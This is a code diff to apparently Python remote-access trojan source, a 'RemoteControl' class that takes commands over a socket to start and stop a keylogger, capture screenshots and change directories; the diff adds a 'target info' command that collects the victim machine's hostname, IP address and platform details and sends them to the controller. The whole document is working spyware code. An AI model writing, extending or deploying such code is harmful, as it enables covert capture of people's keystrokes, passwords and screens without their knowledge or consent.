@@ -10,6 +10,7 @@ import time
 import json
 import subprocess
 import os
+import platform
 from PIL import ImageGrab
 from pynput import keyboard
 
@@ -131,6 +132,20 @@ class RemoteControl:
         # Send a marker to indicate the end of the image
         self.server_socket.send(b"END_OF_IMAGE")
 
+    def sys_info(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        system_info = f"""[+] Target information
+        IP: {ip}
+        platform: {plat}
+        system: {system}
+        machine: {machine}"""
+        time.sleep(0.15)
+        self.send_data_as_json(system_info)
+
     def main_loop(self):
         while True:
             try:
@@ -152,13 +167,13 @@ class RemoteControl:
                     os.chdir(command[3:])
                     continue
 
-                elif command == 'keyscan_start':
+                elif command.startswith('keyscan_start'):
                     self.keylogger_active = True
                     self.active_keylogger_listener = True
                     print("Keylogger started.")
                     continue
 
-                elif command == 'keyscan_stop':
+                elif command.startswith('keyscan_stop'):
                     self.keylogger_active = False
                     print("Keylogger stopped.")
                     continue
@@ -175,6 +190,10 @@ class RemoteControl:
 
                 elif command.startswith('screenshot'):
                     self.screen_shot()
+                    continue
+
+                elif command.startswith('target info'):
+                    self.sys_info()
                     continue
 
                 else:
